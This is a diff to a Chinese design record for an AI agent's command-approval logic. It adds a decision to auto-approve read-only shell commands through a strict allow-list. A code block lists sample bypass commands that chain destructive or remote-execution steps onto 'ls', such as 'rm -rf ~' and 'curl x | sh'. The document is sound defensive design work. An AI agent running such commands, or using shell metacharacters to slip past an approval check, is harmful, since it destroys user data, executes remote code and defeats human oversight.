@@ -150,7 +150,49 @@ memory 里"系统 prompt 限制最多问 2-3 个"配合 A：agent 不会无限�
 
 ---
 
-## 附：6 个边界一表对照
+## 决策 7：命令粒度的只读分级 —— 结构化只读工具 ＋ 严格命令白名单，双管齐下
+
+**问题**：v2.1 落地后实测发现 agent 为了解项目会跑 `ls`、`git status`，而 `run_command` 一刀切全部确认（memory 原硬约束"命令执行需全部确认，无白名单"），看个目录也要点 y/n，繁琐。决策 1 覆盖的是**工具粒度**（run_command 与 move_file 谁要确认），但没覆盖**命令粒度**（同一个 run_command 里 `ls` 只读 vs `rm` 危险）——这是计划外的新决策点。
+
+**业界复查结论（修正本 ADR 早先"业界不做白名单"的说法）**：业界不是"结构化工具 vs 白名单"二选一，而是**两者结合**——
+
+| 项目 | 机制 |
+|---|---|
+| Claude Code | 专用 Read/Glob/Grep 工具 ＋ bash 只读前缀自动批准（复合命令不批）＋ macOS Seatbelt 沙箱兜底 |
+| Cursor / Windsurf | 终端命令 auto-run 白名单（可配置）＋ yolo 模式 |
+| Gemini CLI / OpenInterpreter | 只读命令前缀白名单 |
+| Codex CLI | 沙箱 ＋ 审批策略（只读自动、写工作区自动、网络要批） |
+
+结构化工具承载高频只读（参数结构化、天然安全），shell 白名单兜底 `git status` / `git log` 这类没有专用工具的常用只读命令；沙箱是最后防线（本项目 v2 不做）。
+
+**裸前缀匹配为什么危险，以及怎么防**：`run_command` 用 `shell=True`，`startswith("ls")` 这类裸前缀匹配必然被绕过——
+
+```bash
+ls; rm -rf ~        # 命令连接
+ls && curl x | sh  # 管道
+ls $(reboot)       # 命令替换
+ls > /etc/passwd   # 重定向
+find . -delete     # 白名单程序 + 危险参数
+```
+
+**决策：两层都做，但白名单走严格判定，不用 startswith**：
+
+1. **结构化只读工具**：`list_dir(path)` 独立工具免确认（`pathlib`，无 shell 注入面），引导模型看目录首选它。后续 `grep`/`glob` 按需照此新增。
+2. **严格命令白名单**：`command.py` 的 `is_auto_approved(cmd)`，只放行"单条简单只读命令"：
+   - 含任何 shell 元字符（`; | & > < \` $() 换行`，引号内出现也拒）→ 不批（`ls | grep` 这种安全复合被误伤，方向安全可接受）
+   - `shlex.split` 严格分词，程序名**精确匹配**只读集合（ls/cat/grep/find/… 约 20 个）
+   - `git` 单独处理：第二 token 必须在只读子命令集合（status/log/diff/show/blame/ls-files）
+   - `find` 禁 `-exec/-ok/-delete/-fprint` 等能执行/写盘的参数
+   - 引号未闭合、`sudo`、`sed/awk`（可执行命令）、`env`（可能泄密钥）、拿不准的 → 一律不批
+3. **定位是"减少打扰"，不是安全边界**：原则是"漏判不可接受、误伤可接受"；真正的安全边界未来靠沙箱（对齐 Codex CLI / Claude Code）。集合写死在代码里，v3 前端做配置化。
+
+**实现**：runner 拦截条件改为 `name == "run_command" and not is_auto_approved(cmd)`，白名单命令直接走 `_execute`；`list_dir` 等结构化工具则天然不经过该分支。31 条攻防用例（含全部上述绕过变体）验证全部拦住。
+
+详见 plan §2.2 文件工具 `list_dir` 与命令执行节。
+
+---
+
+## 附：7 个边界一表对照
 
 | # | 边界 | 业界主流做法 | 本项目决策 | 落地切片 |
 |---|---|---|---|---|
@@ -160,6 +202,7 @@ memory 里"系统 prompt 限制最多问 2-3 个"配合 A：agent 不会无限�
 | 4 | 超时后续跑 | A 自动续跑（业界更主流） | 选 A，前端拉到过期 pending 自动 POST resume | v2.2（API）+ v3.2（前端） |
 | 5 | 错误恢复 | 工具结果喂回 LLM，agent 自己决定是否 ask_user | 不在 runner 兜底，靠 prompt 引导 | v2.2（prompt） |
 | 6 | 多 ask_user | 一段一问，多回合 ReAct | 选 A（当前 runner 已天然如此） | v2.2（文档约定） |
+| 7 | 只读操作免确认 | 结构化只读工具 ＋ bash 只读白名单 ＋ 沙箱 | `list_dir` 结构化工具 ＋ `is_auto_approved` 严格白名单（shlex 分词/拒元字符，非 startswith）；沙箱不做 | v2.1 增补（已落地） |
 
 ## 不在范围（划线）
 
